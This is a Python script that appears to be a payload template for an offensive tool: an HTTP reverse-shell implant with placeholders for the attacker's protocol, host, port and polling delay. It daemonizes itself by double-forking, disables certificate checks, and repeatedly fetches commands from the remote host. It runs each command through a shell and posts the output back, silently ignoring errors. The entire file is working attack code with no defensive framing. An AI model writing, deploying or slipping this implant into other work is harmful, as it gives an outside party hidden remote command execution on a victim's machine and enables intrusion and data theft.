import requests
import os, sys, subprocess
import time


def daemonize():
        pid = os.fork()
        if pid > 0:
            sys.exit(0)

        pid = os.fork()
        if pid > 0:
            sys.exit(0)

try:
    daemonize()
except Exception as e:
    pass

requests.packages.urllib3.disable_warnings()
pid = os.getpid()
print(pid)

while True:
    try:
        url = "{PROTO}://{LHOST}:{LPORT}/"
        r = requests.get(url, verify=False)
        if r.status_code == requests.codes.ok and r.text.strip():
            if r.text.strip() == "exit":
                try:
                    requests.post(url, files={None:"Goodbye"}, verify=False)
                except Exception as e:
                    pass
                os._exit(0)
                sys.exit(0)
                requests.post(url, files={None:"Failed to kill {}".format(pid)}, verify=False)

            out = subprocess.check_output(r.text, stderr=subprocess.STDOUT, shell=True) 
            requests.post(url, files={None:out}, verify=False)
        else:
            time.sleep({DELAY})
    except Exception as e:
        pass
